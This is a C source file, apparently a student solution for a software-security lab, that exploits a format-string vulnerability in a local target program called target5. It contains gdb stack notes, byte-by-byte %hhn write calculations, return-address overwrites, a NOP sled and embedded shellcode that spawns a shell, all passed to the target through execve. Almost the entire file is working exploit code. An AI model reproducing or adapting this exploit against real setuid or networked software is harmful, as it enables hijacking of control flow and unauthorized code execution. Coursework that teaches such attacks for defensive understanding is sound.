#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

/*
  In foo:
  Stack level 0, frame at 0x3021feb0:
  rip = 0x400be0 in foo (target5.c:38); saved rip = 0x400e09
  called by frame at 0x3021fed0
  source language c.
  Arglist at 0x3021fea0, args: arg=0x7fffffffd856 "1111"
  Locals at 0x3021fea0, Previous frame's sp is 0x3021feb0
  Saved registers:
    rbp at 0x3021fea0, rip at 0x3021fea8
  (gdb) p &buf
  $1 = (char (*)[1024]) 0x3021faa0
  (gdb) p &formatString
  $2 = (char (*)[256]) 0x3021f9a0

  --------------------------------------------------------------

  In snprintf:
  Stack level 0, frame at 0x3021f990:
  rip = 0x7ffff7857f20 in snprintf; saved rip = 0x400d94
  called by frame at 0x3021feb0
  Arglist at 0x3021f980, args: 
  Locals at 0x3021f980, Previous frame's sp is 0x3021f990
  Saved registers:
    rip at 0x3021f988
*/

int main(void)
{
  char *args[3];
  char *env[20];

  char buf[256];

  // Fill up the buffer with NOP
  for (int i = 0; i < 256; i++) {
      buf[i] = '\x90';
  }

  // Encode format string to achieve desired hack
  /*
    Partition 0x3021fa20:
    0x30: 48
    0xfa: 250
    0x21: 33
    0x30: 48

    Calculate the difference as %hhn writes the cumulative printed length:
    0x30
    0xfa - 0x20 = 202
    0x121 - 0x0fa = 39
    0x30 - 0x21 = 15

    Here in the 3rd calculation, 39 is added.
    So the culmulative length is 0xfa + 39 = 289 (0x121), exceeding 1 byte in size.
    Specifier %hhn writes LSB, which is just 0x21. Same thing in the 1st calculation.
  */
  char specifiers[] = "%08x%08x%08x%08x%16x%hhn%202x%hhn%39x%hhn%15x%hhn";

  /*
    Copy it starting from the 4th bytes of the buffer so that the format specifiers
    would start from the 60th byte of formatString[]:
    0 ~ 3 -> 4 bytes, 4 + 56 = 60 bytes -> 0 ~ 59 of formatString;
    Then the specifiers start from 60th byte.
  */
  for (int i = 0; i < 49; i++) {
    buf[4 + i] = specifiers[i];
  }

  /*
    Inject shellcode at 144th byte;
    By calculation, the address of shellcode will be 0x3021f9a0 + 144 bytes = 0x3021fa30;
    This address will be used to overwrite the return address.
  */
  for (int i = 0; i < 45; i++) {
		buf[88 + i] = shellcode[i];
	}

  buf[252] = '\x00';
  buf[253] = '\x00';
  buf[254] = '\x00';
  buf[255] = '\x00';

  // Return address to be overwritten: 0x3021f988 (rip within snprintf frame)
  char ret_addr_1[] = "\x88\xf9\x21\x30";
  char ret_addr_2[] = "\x89\xf9\x21\x30";
  char ret_addr_3[] = "\x8a\xf9\x21\x30";
  char ret_addr_4[] = "\x8b\xf9\x21\x30";

  // Garbage string
  char garbage[] = "garbage";

  // Encode env to accommodate null bytes
  args[0] = TARGET;
  args[1] = ret_addr_1;
  args[2] = NULL;

  env[0] = "\x00";
  env[1] = "\x00";
  env[2] = "\x00";

  /*
    An 8-byte garbage string needs to be put between the byte-wise address to be written,
    because the %x before each %hhn would cause a jump-reading in stack, and we would like:
      %x   -> garbage values;
      %hhn -> specified byte-wise RIP address.
  */
  env[3] = garbage;

  env[4] =  ret_addr_2;
  env[5] = "\x00";
  env[6] = "\x00";
  env[7] = "\x00";

  env[8] = garbage;

  env[9] = ret_addr_3;
  env[10] = "\x00";
  env[11] = "\x00";
  env[12] = "\x00";

  env[13] = garbage;

  env[14] = ret_addr_4;
  env[15] = "\x00";
  env[16] = "\x00";
  env[17] = "\x00";

  env[18] = buf;
  env[19] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}

/*
  Desired formatString content:

  \x88\xf9\x21\x30 <- return address 1
  \x00\x00\x00\x00
  (garbage values)
  \x89\xf9\x21\x30 <- return address 2
  \x00\x00\x00\x00
  (garbage values)
  \x8a\xf9\x21\x30 <- return address 3
  \x00\x00\x00\x00
  \x8b\xf9\x21\x30 <- return address 4
  \x00\x00\x00\x00
  (garbage values)
  \x90\x90\x90\x90 <- NOPs
  \x25\x30\x38\x78 <- Specifier string start (&formatString[60])
  \x25\x30\x38\x78
  \x25\x30\x38\x78
  \x25\x30\x38\x78
  \x25\x31\x36\x78
  \x25\x68\x68\x6e
  \x25\x32\x30\x32
  \x78\x25\x68\x68
  \x6e\x25\x33\x39
  \x78\x25\x68\x68
  \x6e\x25\x31\x35
  \x78\x25\x68\x68
  \x6e\x90\x90\x90 <- NOPs
  (NOPs in middle)
  \xeb\x1f\x5e\x89 <- Start of shellcode
  \x76\x08\x31\xc0
  \x88\x46\x07\x89
  \x46\x0c\xb0\x0b
  \x89\xf3\x8d\x4e
  \x08\x8d\x56\x0c
  \xcd\x80\x31\xdb
  \x89\xd8\x40\xcd
  \x80\xe8\xdc\xff
  \xff\xff\x2f\x62
  \x69\x6e\x2f\x73
  \x68\x90\x90\x90 <- End of shellcode
  \x90\x90\x90\x90
  (Continuing NOPs)
  (NULLs)
*/